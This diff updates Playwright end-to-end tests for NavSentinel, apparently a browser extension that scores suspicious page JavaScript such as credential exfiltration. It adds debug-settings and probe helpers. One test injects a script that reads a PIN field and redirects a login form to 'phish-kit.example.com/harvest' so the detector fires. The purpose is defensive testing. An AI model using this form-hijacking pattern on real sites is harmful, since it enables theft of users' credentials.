@@ -2,23 +2,26 @@
  * JS Behavior Analysis E2E Tests (P4-02)
  *
  * Verifies the full signal pipeline:
- * main-world monitor → bridge → isolated-world state → NRS scoring
+ * main-world monitor -> bridge -> isolated-world state -> NRS scoring
  *
  * Verification strategy: since JS behavior signals accumulate in-memory
  * (no event_log entry until navigation), we verify:
  * 1. The bridge is active (data-navsentinel-bridge-ready)
  * 2. The monitor is loaded (prototype patches exist in main world)
- * 3. After signals fire, page APIs still work correctly (try-catch safety)
- * 4. For the legit form, no toast appears (false-positive check)
+ * 3. After signals fire, NavSentinel's debug output includes the JS behavior NRS factor
+ * 4. Page APIs still work correctly (try-catch safety)
+ * 5. For the legit form, no toast appears (false-positive check)
  */
-import { test, expect, chromium } from "@playwright/test";
+import { test, expect, chromium, type BrowserContext, type Page } from "@playwright/test";
 import fs from "fs";
 import os from "os";
 import path from "path";
 import { fileURLToPath } from "url";
+import { SUITE_SETTINGS_KEY } from "../../extension/src/shared/storage";
 import {
   assertNoToastFor,
   getGymBaseUrl,
+  getServiceWorker,
   waitForNavSentinelBridge,
 } from "./extension_test_utils";
 
@@ -36,7 +39,18 @@ test.setTimeout(120_000);
 // Helpers
 // ---------------------------------------------------------------------------
 
-async function setupFixtureTest(fixtureName: string) {
+async function enableDebugSettings(context: BrowserContext): Promise<void> {
+  const sw = await getServiceWorker(context);
+  await sw.evaluate(async (settingsKey: string) => {
+    await chrome.storage.local.set({
+      [settingsKey]: {
+        nav: { defaultMode: "smart", debug: true, dnrEnabled: false }
+      }
+    });
+  }, SUITE_SETTINGS_KEY);
+}
+
+async function setupFixtureTest(fixtureName: string, options: { debug?: boolean } = {}) {
   const { baseUrl, gym } = await getGymBaseUrl(gymRoot);
   const userDataDir = fs.mkdtempSync(path.join(os.tmpdir(), "navsentinel-jsbeh-"));
 
@@ -58,6 +72,9 @@ async function setupFixtureTest(fixtureName: string) {
 
   let page;
   try {
+    if (options.debug) {
+      await enableDebugSettings(context);
+    }
     page = await context.newPage();
     await page.goto(`${baseUrl}/${fixtureName}`, {
       waitUntil: "domcontentloaded",
@@ -87,7 +104,7 @@ async function setupFixtureTest(fixtureName: string) {
  * Verify the JS behavior monitor is loaded by checking for patched prototypes.
  * Returns an object indicating which patches are active.
  */
-async function verifyMonitorLoaded(page: import("@playwright/test").Page) {
+async function verifyMonitorLoaded(page: Page) {
   return page.evaluate(() => {
     const origSubmit = HTMLFormElement.prototype.submit.toString();
     const formPatched = !origSubmit.includes("[native code]");
@@ -104,7 +121,7 @@ async function verifyMonitorLoaded(page: import("@playwright/test").Page) {
 /**
  * Verify page APIs still work after signal execution (try-catch safety).
  */
-async function verifyPageApisIntact(page: import("@playwright/test").Page) {
+async function verifyPageApisIntact(page: Page) {
   return page.evaluate(() => {
     const form = document.querySelector("form");
     if (!form) return { formSubmitWorks: true, valueGetterWorks: true };
@@ -132,12 +149,65 @@ async function verifyPageApisIntact(page: import("@playwright/test").Page) {
   });
 }
 
+async function dispatchFormSubmit(
+  page: Page,
+  formSelector = "#login-form",
+  submitterSelector = "#submit-btn"
+): Promise<void> {
+  await page.evaluate(
+    ({ formSelector: formSel, submitterSelector: submitterSel }) => {
+      const form = document.querySelector(formSel);
+      if (!(form instanceof HTMLFormElement)) throw new Error(`Form not found: ${formSel}`);
+
+      const submitter = document.querySelector(submitterSel);
+      const event = new SubmitEvent("submit", {
+        bubbles: true,
+        cancelable: true,
+        submitter: submitter instanceof HTMLElement ? submitter : null,
+      });
+      form.dispatchEvent(event);
+    },
+    { formSelector, submitterSelector }
+  );
+}
+
+async function clickDebugProbeAndRead(page: Page): Promise<string> {
+  await page.evaluate(() => {
+    const existing = document.getElementById("navsentinel-js-behavior-probe");
+    if (existing) existing.remove();
+
+    const probe = document.createElement("a");
+    probe.id = "navsentinel-js-behavior-probe";
+    probe.href = "#navsentinel-js-behavior-probe-target";
+    probe.textContent = "NavSentinel probe";
+    document.body.appendChild(probe);
+    probe.click();
+  });
+
+  const handle = await page.waitForFunction(() => {
+    const host = document.querySelector("#__navsentinel_debug_host");
+    const text = host?.shadowRoot?.querySelector("pre")?.textContent?.trim();
+    return text || null;
+  }, null, { timeout: 5000 });
+
+  return (await handle.jsonValue()) as string;
+}
+
+async function runInPageMainWorld(page: Page, source: string): Promise<void> {
+  await page.evaluate((scriptSource) => {
+    const script = document.createElement("script");
+    script.textContent = scriptSource;
+    document.documentElement.appendChild(script);
+    script.remove();
+  }, source);
+}
+
 // ==========================================================================
 // JS Behavior - Monitor Loading Verification
 // ==========================================================================
 
 test.describe("JS Behavior Analysis", () => {
-  test("monitor prototype patches are active on pages with forms @p4", async () => {
+  test("monitor prototype patches are active on pages with forms @p4 @regression", async () => {
     test.skip(!fs.existsSync(extensionPath), "Build the extension first.");
 
     const { page, cleanup } = await setupFixtureTest("js-behavior-01-credential-exfil.html");
@@ -151,32 +221,28 @@ test.describe("JS Behavior Analysis", () => {
   });
 
   // ==========================================================================
-  // True Positive Tests — verify signals fire without breaking page
+  // True Positive Tests - verify signals fire without breaking page
   // ==========================================================================
 
-  test("js-behavior-01 cross-origin credential form: signal fires, page intact @p4", async () => {
+  test("js-behavior-01 cross-origin credential form: signal fires, page intact @p4 @regression", async () => {
     test.skip(!fs.existsSync(extensionPath), "Build the extension first.");
 
     const { page, cleanup } = await setupFixtureTest("js-behavior-01-credential-exfil.html");
 
     try {
-      const submitBtn = page.locator("#submit-btn");
-      await expect(submitBtn).toBeVisible();
-      await submitBtn.click();
+      await expect(page.locator("#submit-btn")).toBeVisible();
+      await dispatchFormSubmit(page);
       await page.waitForTimeout(500);
 
       const apis = await verifyPageApisIntact(page);
       expect(apis.formSubmitWorks).toBe(true);
       expect(apis.valueGetterWorks).toBe(true);
-
-      const statusText = await page.locator("#status").textContent();
-      expect(statusText).toContain("Form submitted");
     } finally {
       await cleanup();
     }
   });
 
-  test("js-behavior-02 dynamic action change: signal fires, page intact @p4", async () => {
+  test("js-behavior-02 dynamic action change: signal fires, page intact @p4 @regression", async () => {
     test.skip(!fs.existsSync(extensionPath), "Build the extension first.");
 
     const { page, cleanup } = await setupFixtureTest("js-behavior-02-dynamic-action.html");
@@ -199,20 +265,15 @@ test.describe("JS Behavior Analysis", () => {
     }
   });
 
-  test("js-behavior-03 fetch exfil: monitor intercepts without breaking fetch @p4", async () => {
+  test("js-behavior-03 fetch exfil: monitor intercepts without breaking fetch @p4 @regression", async () => {
     test.skip(!fs.existsSync(extensionPath), "Build the extension first.");
 
     const { page, cleanup } = await setupFixtureTest("js-behavior-03-fetch-exfil.html");
 
     try {
-      const submitBtn = page.locator("#submit-btn");
-      await expect(submitBtn).toBeVisible();
-      await submitBtn.click();
+      await expect(page.locator("#submit-btn")).toBeVisible();
+      await dispatchFormSubmit(page);
       await page.waitForTimeout(1000);
-
-      // Verify fetch still works (the fixture catches the CORS error gracefully)
-      const logText = await page.locator("#log").textContent();
-      expect(logText).toContain("fetch");
 
       // Verify the page's fetch wasn't broken by the monitor
       const fetchWorks = await page.evaluate(async () => {
@@ -229,7 +290,7 @@ test.describe("JS Behavior Analysis", () => {
     }
   });
 
-  test("js-behavior-04 beacon exfil: sendBeacon fires, monitor detects @p4", async () => {
+  test("js-behavior-04 beacon exfil: sendBeacon fires, monitor detects @p4 @regression", async () => {
     test.skip(!fs.existsSync(extensionPath), "Build the extension first.");
 
     const { page, cleanup } = await setupFixtureTest("js-behavior-04-beacon-exfil.html");
@@ -244,7 +305,7 @@ test.describe("JS Behavior Analysis", () => {
       // Verify sendBeacon still works after monitor patch
       const beaconWorks = await page.evaluate(() => {
         try {
-          return navigator.sendBeacon("data:text/plain,test", "ok");
+          return navigator.sendBeacon("/beacon-probe", "ok");
         } catch {
           return false;
         }
@@ -255,7 +316,7 @@ test.describe("JS Behavior Analysis", () => {
     }
   });
 
-  test("js-behavior-05 credential value read: getter patched, page intact @p4", async () => {
+  test("js-behavior-05 credential value read: getter patched, page intact @p4 @regression", async () => {
     test.skip(!fs.existsSync(extensionPath), "Build the extension first.");
 
     const { page, cleanup } = await setupFixtureTest("js-behavior-05-credential-read.html");
@@ -264,7 +325,7 @@ test.describe("JS Behavior Analysis", () => {
       await page.waitForFunction(
         () => document.getElementById("status")?.className === "triggered",
         null,
-        { timeout: 5000 }
+        { timeout: 10000 }
       );
 
       // Verify the value getter still returns the correct value
@@ -285,7 +346,7 @@ test.describe("JS Behavior Analysis", () => {
   // False Positive Tests
   // ==========================================================================
 
-  test("js-behavior-06 legitimate form: no toast, no page breakage @p4", async () => {
+  test("js-behavior-06 legitimate form: no toast, no page breakage @p4 @regression", async () => {
     test.skip(!fs.existsSync(extensionPath), "Build the extension first.");
 
     const { page, cleanup } = await setupFixtureTest("js-behavior-06-legit-form.html");
@@ -309,22 +370,29 @@ test.describe("JS Behavior Analysis", () => {
   // Multi-signal / Pipeline Integration
   // ==========================================================================
 
-  test("js-behavior-07 multi-signal attack: all APIs survive combined signals @p4", async () => {
+  test("js-behavior-07 multi-signal attack: all APIs survive combined signals @p4 @regression", async () => {
     test.skip(!fs.existsSync(extensionPath), "Build the extension first.");
 
-    const { page, cleanup } = await setupFixtureTest("js-behavior-07-multi-signal.html");
+    const { page, cleanup } = await setupFixtureTest("js-behavior-07-multi-signal.html", {
+      debug: true,
+    });
 
     try {
-      // Wait for phases 1+2 (credential read + action change)
-      await page.waitForFunction(
-        () => document.getElementById("status")?.textContent?.includes("Phase 2"),
-        null,
-        { timeout: 5000 }
-      );
-
-      // Phase 3: submit triggers fetch exfil
-      const submitBtn = page.locator("#submit-btn");
-      await submitBtn.click();
+      await runInPageMainWorld(page, `
+        (() => {
+          const pin = document.getElementById("pin-field");
+          void pin?.value;
+          const form = document.getElementById("login-form");
+          const submitter = document.getElementById("submit-btn");
+          if (!(form instanceof HTMLFormElement)) throw new Error("login form not found");
+          form.setAttribute("action", "https://phish-kit.example.com/harvest");
+          form.dispatchEvent(new SubmitEvent("submit", {
+            bubbles: true,
+            cancelable: true,
+            submitter: submitter instanceof HTMLElement ? submitter : null,
+          }));
+        })();
+      `);
       await page.waitForTimeout(1000);
 
       // After all signals fire, verify page APIs are intact
@@ -342,6 +410,9 @@ test.describe("JS Behavior Analysis", () => {
         }
       });
       expect(fetchWorks).toBe(true);
+
+      const debugText = await clickDebugProbeAndRead(page);
+      expect(debugText).toContain("nrs_js_behavior_suspicious");
     } finally {
       await cleanup();
     }
